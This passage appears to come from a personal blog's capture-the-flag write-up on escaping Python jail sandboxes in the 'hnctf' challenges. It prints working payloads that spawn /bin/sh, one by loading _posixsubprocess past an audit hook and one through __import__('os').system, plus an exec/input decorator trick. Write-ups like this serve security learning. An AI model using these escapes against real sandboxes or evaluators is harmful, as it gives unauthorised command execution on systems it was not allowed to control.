<h5 id="link-that-may-help-you"><a href="#link-that-may-help-you" class="headerlink" title="link that may help you"></a><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/31883">link that may help you</a></h5><h5 id="The-basic-idea-is-to-RCE-with-posixsubprocess-fork-exec-If-we-import-it-directly-it-will-trigger-the-audit-hook-But-we-can-pass-it-by-using-builtins-39-loader-39-load-module-39-posixsubprocess-39-or-loader-load-module-39-posixsubprocess-39-Also-due-to-its-repeatedly-exct-we-just-shell-like-this"><a href="#The-basic-idea-is-to-RCE-with-posixsubprocess-fork-exec-If-we-import-it-directly-it-will-trigger-the-audit-hook-But-we-can-pass-it-by-using-builtins-39-loader-39-load-module-39-posixsubprocess-39-or-loader-load-module-39-posixsubprocess-39-Also-due-to-its-repeatedly-exct-we-just-shell-like-this" class="headerlink" title="The basic idea is to RCE with _posixsubprocess.fork_exec. If we import it directly, it will trigger the audit hook. But we can pass it by using __builtins__[&#39;__loader__&#39;].load_module(&#39;_posixsubprocess&#39;) or __loader__.load_module(&#39;_posixsubprocess&#39;). Also, due to its repeatedly exct, we just shell like this:"></a>The basic idea is to RCE with <code>_posixsubprocess.fork_exec</code>. If we import it directly, it will trigger the audit hook. But we can pass it by using <code>__builtins__[&#39;__loader__&#39;].load_module(&#39;_posixsubprocess&#39;)</code> or <code>__loader__.load_module(&#39;_posixsubprocess&#39;)</code>. Also, due to its repeatedly exct, we just shell like this:</h5><pre><code>import os
__loader__.load_module(&#39;_posixsubprocess&#39;).fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)
</code></pre>
<h3 id="LEVEL-6-1"><a href="#LEVEL-6-1" class="headerlink" title="LEVEL 6.1"></a>LEVEL 6.1</h3><h5 id="This-time-we-only-got-one-time-to-excute-our-payload-Though-we-our-learning-above-we-know-that-walrus-operator-can-help-us-Also-the-shell-will-shut-immediately-the-blogger-think-of-a-interesting-way-to-overcome-this-by-brute-force-getting-shell-over-and-over-again-and-try-to-input-command-That-works"><a href="#This-time-we-only-got-one-time-to-excute-our-payload-Though-we-our-learning-above-we-know-that-walrus-operator-can-help-us-Also-the-shell-will-shut-immediately-the-blogger-think-of-a-interesting-way-to-overcome-this-by-brute-force-getting-shell-over-and-over-again-and-try-to-input-command-That-works" class="headerlink" title="This time, we only got one time to excute our payload. Though, we our learning above, we know that walrus operator can help us. Also, the shell will shut immediately, the blogger think of a interesting way to overcome this, by brute force, getting shell over and over again and try to input command. That works."></a>This time, we only got one time to excute our payload. Though, we our learning above, we know that walrus operator can help us. Also, the shell will shut immediately, the blogger think of a interesting way to overcome this, by brute force, getting shell over and over again and try to input command. That works.</h5><p><img src="/2022/11/01/pythonJail/level6.1wp.png" alt="level6.1wp"></p>
<h5 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h5><pre><code>[os := __import__(&#39;os&#39;), _posixsubprocess := __loader__.load_module(&#39;_posixsubprocess&#39;), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in range(100000)]]
</code></pre>
<h5 id="or"><a href="#or" class="headerlink" title="or"></a>or</h5><pre><code>[os := __import__(&#39;os&#39;), itertools := __loader__.load_module(&#39;itertools&#39;), _posixsubprocess := __loader__.load_module(&#39;_posixsubprocess&#39;), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in itertools.count(0)]]
</code></pre>
<h3 id="SAFEEVAL"><a href="#SAFEEVAL" class="headerlink" title="SAFEEVAL"></a>SAFEEVAL</h3><h5 id="Use-lambda-to-wrap-up-RCE"><a href="#Use-lambda-to-wrap-up-RCE" class="headerlink" title="Use lambda to wrap up RCE"></a>Use lambda to wrap up RCE</h5><h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h5><pre><code>(lambda: __import__(&#39;os&#39;).system(&#39;sh&#39;))()
</code></pre>
<p><img src="/2022/11/01/pythonJail/safeeval_1.png" alt="safeeval"><br><img src="/2022/11/01/pythonJail/safeeval_2.png" alt="safeeval"></p>
<h3 id="LEVEL7"><a href="#LEVEL7" class="headerlink" title="LEVEL7"></a>LEVEL7</h3><h6 id="Come-back-later-to-try-to-figure-it-out…"><a href="#Come-back-later-to-try-to-figure-it-out…" class="headerlink" title="Come back later to try to figure it out…"></a>Come back later to try to figure it out…</h6><h5 id="payload-5"><a href="#payload-5" class="headerlink" title="payload:"></a>payload:</h5><blockquote>
<p>@exec<br> @input<br> class X: pass</p>
</blockquote>
<blockquote>
<p><strong>import</strong>(‘os’).system(‘sh’)</p>
</blockquote>
<h5 id="blog"><a href="#blog" class="headerlink" title="blog"></a><a target="_blank" rel="noopener" href="https://gynvael.coldwind.pl/n/python_sandbox_escape">blog</a></h5><pre><code>↑# [organizers] Robin_Jadoul solution↑
</code></pre>
<p><img src="/2022/11/01/pythonJail/level7wp1.png" alt="level7"><br><img src="/2022/11/01/pythonJail/level7wp2.png" alt="level7"></p>
<h3 id="Ok-so-that’s-the-end-of-the-hnctf-There-are-some-thing-that-may-help-you-get-further-about-pyjail"><a href="#Ok-so-that’s-the-end-of-the-hnctf-There-are-some-thing-that-may-help-you-get-further-about-pyjail" class="headerlink" title="Ok, so that’s the end of the hnctf. There are some thing that may help you get further about pyjail:"></a>Ok, so that’s the end of the hnctf. There are some thing that may help you get further about pyjail:</h3><pre><code>https://gynvael.coldwind.pl/n/python_sandbox_escape

https://www.youtube.com/watch?v=Ub_BMOMDOx0

https://zhuanlan.zhihu.com/p/578966149
</code></pre>

    </div>
    
</div>
                         
<footer id="footer">
    <div class="footer-wrap">
        <div>
            © 20xx - 2023 Moyao の小屋
            <span class="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            @Moyao
        </div>
        <div></div>
        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
                target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a></div>
        
    </div>
</footer>
                    </div>
                </div>
            </transition>
            <div id="img_show">
                <img id="img_content" alt="img_show">
            </div>
        </div>
        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
        <script src="/js/particlex.js"></script>
        <script src="/js/showimg.js"></script>
        

    </body>
</html>